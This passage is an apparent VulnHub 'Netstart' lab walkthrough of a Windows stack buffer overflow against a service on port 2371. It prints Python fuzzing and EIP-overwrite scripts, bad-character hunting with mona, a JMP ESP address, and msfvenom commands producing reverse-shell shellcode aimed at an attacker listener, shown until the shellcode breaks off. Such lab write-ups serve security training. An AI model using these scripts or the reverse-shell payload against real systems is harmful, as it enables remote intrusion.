AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# nc -nv 192.168.57.11 2371
(UNKNOWN) [192.168.57.11] 2371 (?) open
Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p id="3a2fdfd7-c9c1-470e-8dc7-cb47c8547f8b" class="">
</p><figure id="5f039e0e-84ce-41d6-afe7-0276beea8683" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%201.png"><img style="width:680px" src="../../images/vulnhub/netstart/Untitled%201.png"/></a></figure><p id="698a5a55-e2b0-45c6-8b7f-e1f725936d44" class="">
</p><p id="4c227b8c-4392-469f-ac61-79109aa3f21f" class="">Fuzzing script:</p><p id="e0150898-e66e-4ddf-8048-3745ac5e067d" class="">
</p><pre id="402d40fb-6da0-4172-817d-08da34e9cb44" class="code code-wrap"><code>#!/usr/bin/env python3

import socket, time, sys

ip = &quot;192.168.57.11&quot;

port = 2371
timeout = 5
string = &quot;A&quot; * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Fuzzing with {} bytes&quot;.format(len(string)))
      s.send(bytes(string, &quot;latin-1&quot;))
      s.recv(1024)
  except:
    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string)))
    sys.exit(0)
  string += 100 * &quot;A&quot;
  time.sleep(1)
</code></pre><p id="22b30c85-fae0-44cd-9fe8-40cc6987cc7c" class="">
</p><p id="9261b453-0dd1-4310-8f88-330a3e387e61" class="">Executing the fuzzing script:</p><p id="fbacd420-7f2f-49f3-ba28-c0fda354acef" class="">
</p><pre id="539fd3b7-3b83-474e-ab49-1f84bba206fd" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing crashed at 1700 bytes</code></pre><p id="453b4244-e45f-40f3-a656-8ac5efc20a62" class="">
</p><h2 id="785d2687-7dcd-4f17-8ebd-714f5209a1f9" class=""><mark class="highlight-blue">Finding the EIP Offset:</mark></h2><p id="dcf11dc7-2f9f-4688-8a1b-f67141c25cd4" class="">
</p><p id="b8782234-7bbe-471b-b3b9-013d1304e909" class="">creating a pattern with metasploit scripts:

To create the pattern we will use the metasploit script msf-pattern_create.</p><pre id="01d787ff-49fc-49b2-8da8-2d2806c5d245" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co</code></pre><p id="c98b69ed-f844-4e8d-80d0-c210fc71a864" class="">
</p><p id="d05cf01e-d463-4ef6-857b-4fbe78b389d7" class="">Script to fuzz the application to find the EIP Offset:</p><pre id="4b134346-db65-49f6-8766-4c27c95ca8fb" class="code code-wrap"><code>#!/usr/bin/env python3

import socket, time, sys

ip = &quot;192.168.57.11&quot;

port = 2371
timeout = 5
string = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co&quot;

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Sending Evil Buffer&quot;.format(len(string)))
      s.send(bytes(string, &quot;latin-1&quot;))
      s.recv(1024)
except:
    sys.exit(0)
</code></pre><p id="512651b5-547b-435d-958a-04e89b333a2a" class="">
We will open the exe again and start the process in Immunity debugger. Now we will execute the script.</p><pre id="752c3c06-0acb-4b20-8405-428b88828212" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 findingtheeip.py
Sending Evil Buffer</code></pre><p id="d6ca0559-a925-4063-a43e-776c40f06251" class="">
</p><figure id="5fb0e3d9-4961-4714-862d-18f7400f6e36" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%202.png"><img style="width:1918px" src="../../images/vulnhub/netstart/Untitled%202.png"/></a></figure><p id="64174366-3ee6-49ac-b93e-3550b15575ee" class="">
The value of the EIP is 65433765.
We will find the EIP offset using metasploit script msf-pattern_offset.
</p><pre id="dfbff24b-1ffe-4bf5-93d4-1379117f0ed3" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msf-pattern_offset -q 65433765
[*] Exact match at offset 1702</code></pre><p id="54926bcd-ea96-407c-beb0-b011a1618449" class="">
The value of the EIP offset is 1702.</p><h2 id="ec7ab677-c52d-4f1f-a132-853cf84b6c3d" class=""><mark class="highlight-blue">Replacing the EIP</mark></h2><p id="44633407-74ad-43ab-a12f-d9af9c13405d" class="">
</p><p id="af8b4e50-5181-4011-a955-91fed3e12d5f" class="">Script to replace the EIP</p><p id="65b57f0f-9fed-4a0b-8ed3-eb62df5ce37b" class="">
</p><pre id="3f9157d0-eb9d-4ea7-ad7d-9d5ea25efcba" class="code code-wrap"><code>#!/usr/bin/env python3

import socket, time, sys

ip = &quot;192.168.57.11&quot;
port = 2371
timeout = 5
total_length = 2000
offset = 1702
new_eip = b&quot;BBBB&quot;
string = b&quot;A&quot; * offset + new_eip + b&quot;C&quot; * (total_length - offset - len(new_eip))

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Sending Evil Buffer&quot;.format(len(string)))
      s.send(string)
      s.recv(1024)
except:
    sys.exit(0)</code></pre><p id="c141adeb-918e-458e-9db2-6782efe82b3c" class="">
</p><p id="68ac644f-b9b6-404a-a9ef-f98e0ce58c54" class="">We will restart the program in Immunity Debugger and then execute the Python Script.</p><p id="5dda706b-7bf9-45f0-8da7-0103d444f8b5" class="">
</p><pre id="75afeea1-88a5-4914-b1db-9f1a168183c4" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 replacetheip.py
Sending Evil Buffer</code></pre><p id="b6589a5a-dca2-4dbe-bf97-6d001ca9d284" class="">
</p><figure id="452b8793-f466-4d49-b802-e719190821a3" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%203.png"><img style="width:1919px" src="../../images/vulnhub/netstart/Untitled%203.png"/></a></figure><p id="e3041772-d2e8-4fbd-8100-529a6b8d6cd9" class="">
</p><h2 id="bf1c4911-266e-4335-8767-3922b3404cf7" class=""><mark class="highlight-blue">Finding the bad characters</mark></h2><p id="881d46c4-d8a8-489c-a1d2-18e20b504bb7" class="">
</p><p id="1231ddff-8df1-42bc-8628-e66268eaaad0" class="">Setting up mona:</p><p id="e04823b7-d537-45c4-b8ca-7c458d0c0a51" class="">
</p><pre id="137516c4-9b9d-43a4-8d1f-df6b60782445" class="code"><code>!mona config -set workingfolder C:\Immunitylogs\%p</code></pre><p id="47adc205-9000-490c-b291-31912d280114" class="">
</p><p id="d9f9ab67-9912-4c49-b0e6-f4d6e943092a" class="">Generating byte array using mona:</p><p id="4db9f145-7356-46a5-842e-b60a32774e29" class="">
</p><pre id="52549673-1f15-4120-a1f0-cfbbacd4b517" class="code"><code>!mona bytearray -b &quot;\x00&quot;</code></pre><p id="4e68ed49-646d-43d8-b0bc-d37d7f46f427" class="">
</p><p id="5394e3a0-a0dd-4640-9925-6c4dd9aa4c85" class="">Script to crash the Application:</p><p id="59265656-b065-43c1-849a-adec9123212c" class="">
</p><pre id="41a020cf-f24a-47f4-a589-8037a2723199" class="code code-wrap"><code>#!/usr/bin/env python3

import socket
import sys
import struct


ip = &quot;192.168.57.11&quot;
port = 2371
timeout = 5
total_length = 2000
offset = 1702
new_eip = b&quot;BBBB&quot;
all_characters = b&quot;&quot;.join([struct.pack(&#x27;&lt;B&#x27;, x) for x in range(1, 256)])
string = b&quot;A&quot; * offset + new_eip + all_characters + b&quot;C&quot; * (total_length - offset - len(new_eip) - len(all_characters))
print(len(string))

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print(&quot;Sending Evil Buffer&quot;.format(len(string)))
      s.send(string)
      s.recv(1024)
except:
    sys.exit(0)</code></pre><p id="50e47cc1-9e99-47b4-b70a-289937540365" class="">
</p><p id="fa8cbed5-34da-435f-aa6f-23484309b0d0" class="">We will restart the process in Immunity Debugger and execute the script.</p><p id="0608c317-97b9-4bb8-8073-4cbd025147cf" class="">
</p><pre id="53b7642a-5ac7-454f-b162-555074a9e41a" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# python3 findingthebadcharacters.py
Sending Evil Buffer</code></pre><p id="5a5e331e-b3ba-4253-9ac4-f54acce483f2" class="">
</p><figure id="9bc4be98-bea6-4c8e-9c94-6e07d6de3d64" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%204.png"><img style="width:1920px" src="../../images/vulnhub/netstart/Untitled%204.png"/></a></figure><p id="27218eb4-381b-4019-a6da-0330c96d15c5" class="">
The value of the ESP is 0172FB60.</p><p id="39fca163-fa68-4ea7-913a-20e6d86c4fd3" class="">
</p><figure id="6142f1b5-dcbf-4b3e-9072-fbc074124dde" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%205.png"><img style="width:1919px" src="../../images/vulnhub/netstart/Untitled%205.png"/></a></figure><p id="fbcb09b6-2433-4caa-970e-5e2301f0ec96" class="">
We will repeat this process till there are no bad characters found.

The bad characters are ‚Äú\x00\x2d\x2e\x46\x47\x59\x5e\x60‚Äù.</p><h2 id="ec9c42ec-06bb-4059-bddf-1ba007380164" class=""><mark class="highlight-blue">Finding the right modules</mark></h2><p id="0f29526b-ac23-45b9-9985-335feb8275ec" class="">
</p><pre id="394f5b37-bd12-4b26-9147-b4c739af589e" class="code"><code>!mona find -s &quot;\xff\xe4&quot; -m login_support.dll</code></pre><p id="fe5238a7-1ae1-477b-bab5-05ff91564b9c" class="">
</p><figure id="c158cb65-1456-471f-b1aa-7216c40a7bc2" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled%206.png"><img style="width:1798px" src="../../images/vulnhub/netstart/Untitled%206.png"/></a></figure><p id="bd7a96e9-00d3-482a-aad4-dd093a4ffff0" class="">
</p><p id="178b1c2c-e6d3-4d9d-aabd-1f9e6600f053" class="">We will use 625012B8.</p><h2 id="db32572f-5327-45fd-a497-a84f4b2693ef" class=""><mark class="highlight-blue">Generating the Shell code</mark></h2><p id="2bd14432-713b-4b47-abbe-2ef54407f4e6" class="">
</p><pre id="f5699965-6452-4971-a796-4f97c9f8fa3c" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.57.4 LPORT=4444 EXITFUNC=thread ‚Äìe x86/shikata_ga_nai -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot; -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=11, char=0x5e)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=254, char=0x00)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
Error: No valid set instruction could be created!</code></pre><p id="5f812c6e-2bd9-40c8-88fa-8c83cc5a5751" class="">
We are not able to generate a payload using the non-staged payload. We will try to use a staged payload.</p><p id="add3cb3b-d1d2-47fa-8113-f49c1cd8cc47" class="">
</p><pre id="75089a22-5dca-4aa4-ad9d-b76d4f081467" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.57.4 LPORT=4444 -f py -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=11, char=0x5e)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=106, char=0x2d)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov succeeded with size 347 (iteration=0)
x86/fnstenv_mov chosen with final size 347
Payload size: 347 bytes
Final size of py file: 1696 bytes
buf =  b&quot;&quot;
buf += b&quot;\x2b\xc9\xb1\x51\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73&quot;
buf += b&quot;\x13\x23\xf5\xf6\xc2\x83\xeb\xfc\xe2\xf4\xdf\x1d\x74&quot;
buf += b&quot;\xc2\x23\xf5\x96\x4b\xc6\xc4\x36\xa6\xa8\xa5\xc6\x49&quot;
buf += b&quot;\x71\xf9\x7d\x90\x37\x7e\x84\xea\x2c\x42\xbc\xe4\x12&quot;
buf += b&quot;\x0a\x5a\xfe\x42\x89\xf4\xee\x03\x34\x39\xcf\x22\x32&quot;
buf += b&quot;\x14\x30\x71\xa2\x7d\x90\x33\x7e\xbc\xfe\xa8\xb9\xe7&quot;
buf += b&quot;\xba\xc0\xbd\xf7\x13\x72\x7e\xaf\xe2\x22\x26\x7d\x8b&quot;
